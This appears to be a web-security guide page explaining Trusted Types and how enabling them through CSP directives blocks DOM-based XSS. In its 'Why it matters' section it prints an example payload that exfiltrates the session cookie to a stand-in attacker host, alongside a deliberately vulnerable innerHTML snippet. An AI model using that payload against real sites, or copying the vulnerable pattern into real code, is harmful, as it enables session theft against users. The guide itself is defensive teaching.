---
title: "Trusted Types"
slug: trusted-types
category: security
summary: "Trusted Types make the browser reject plain strings at DOM injection sinks like innerHTML, demanding a vetted typed value instead. Switched on with two CSP directives, it neutralises a whole class of DOM-based XSS."
status: recommended
order: 95
appliesTo: [all]
relatedSlugs: [content-security-policy, subresource-integrity, reporting-endpoints]
updated: "2026-06-23T10:00:00.000Z"
sources:
  - title: "Trusted Types (W3C Working Draft)"
    url: "https://www.w3.org/TR/trusted-types/"
    publisher: "W3C"
  - title: "MDN — Trusted Types API"
    url: "https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API"
    publisher: "MDN"
  - title: "MDN — Content-Security-Policy: require-trusted-types-for"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for"
    publisher: "MDN"
  - title: "OWASP — DOM based XSS Prevention Cheat Sheet"
    url: "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"
    publisher: "OWASP"
---

## What it is

Trusted Types is a browser mechanism that blocks DOM-based cross-site scripting at the point of injection. DOM XSS happens when an attacker-controlled string reaches a dangerous "sink" — `innerHTML`, `outerHTML`, `document.write()`, `eval()`, or a script element's `src`. Trusted Types makes the browser refuse a plain string at those sinks and demand a non-spoofable typed value (`TrustedHTML`, `TrustedScript`, or `TrustedScriptURL`) produced by a policy you define and control. You enable it with two Content Security Policy directives:

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types escape
```

It reached [Baseline](https://web.dev/baseline) in February 2026 — Chrome and Edge have shipped it since 2020, Safari since version 26, and Firefox completed the set.

## Why it matters

A nonce-based [CSP](/spec/security/content-security-policy/) stops an attacker injecting or running a new external script, but DOM XSS needs no new script element: it abuses code already on the page that writes untrusted input into a sink. Take a search widget that echoes the query from the URL:

```js
// Vulnerable: q comes straight from the address bar
const q = new URLSearchParams(location.search).get("q");
results.innerHTML = `<h2>Results for ${q}</h2>`;
```

A visitor sent to `?q=<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">` runs the attacker's script in your origin — the `onerror` handler fires the moment the broken image loads, and the session cookie leaves the building. No external script, no CSP `script-src` violation; a nonce never gets a look-in.

Trusted Types closes that gap. With `require-trusted-types-for 'script'` enforced, that `innerHTML` assignment throws a `TypeError` before the string ever reaches the parser, because `q` is a plain string and not a `TrustedHTML` value. To make the page work again you must route the value through a policy that sanitises it:

```js
const policy = trustedTypes.createPolicy("escape", {
  createHTML: (s) => DOMPurify.sanitize(s),
});
results.innerHTML = policy.createHTML(`<h2>Results for ${q}</h2>`);
```

The `<img onerror>` is now stripped before it lands. The win is structural: the question stops being "did every developer remember to sanitise every sink?" and becomes "does *any* sink receive an unsanitised string?" — and the browser answers that for you, everywhere, by throwing.

This covers more than `innerHTML`. The three trusted types guard the three families of script-execution sink:

- **`TrustedHTML`** — markup parsers: `innerHTML`, `outerHTML`, `document.write()`, `insertAdjacentHTML()`, `<iframe srcdoc>`.
- **`TrustedScript`** — direct code execution: `eval()`, `new Function()`, inline event-handler properties, a `<script>` element's text.
- **`TrustedScriptURL`** — loading code by URL: `<script src>`, `Worker()`, `import()`.

Each turns "exploitable" into "throws before it executes".

## How to implement

1. **Deploy in report-only first** so you can find every sink your code touches without breaking the page:

   ```http
   Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; trusted-types escape; report-to csp-endpoint
   ```

2. **Create a policy that sanitises** rather than passing input through untouched. A vetted sanitiser such as DOMPurify is the usual choice:

   ```js
   trustedTypes.createPolicy("escape", {
     createHTML: (input) => DOMPurify.sanitize(input),
   });
   ```

3. **Name the policies you allow** in the `trusted-types` directive — here, `escape`. One name is special: a policy called `default` is applied automatically wherever a sink expects a trusted value, which lets you retrofit a large codebase without editing every call site.
4. **Switch to enforcing** (`Content-Security-Policy`) once the report stream is clean.

## Common mistakes

- **A pass-through default policy** that returns its input unchanged — it satisfies the type check while re-opening the exact hole you closed.
- **Omitting `trusted-types`.** Without the allowlist, code can create a policy of any name, including a malicious one; name your policies explicitly.
- **Treating it as a CSP replacement.** It is a layer on top of a strict CSP and [Subresource Integrity](/spec/security/subresource-integrity/), not a substitute.
- **Going straight to enforcing.** Untested, it breaks legitimate DOM code; always start report-only.

## Verification

- `curl -sI https://example.com | grep -i content-security-policy` should show `require-trusted-types-for 'script'`.
- In DevTools, run `document.body.innerHTML = '<img src=x>'`; under enforcement it throws a `TypeError`.
- Wire violations to a [reporting endpoint](/spec/security/reporting-endpoints/) and watch for `trusted-types-sink-violation` reports before and after you tighten.
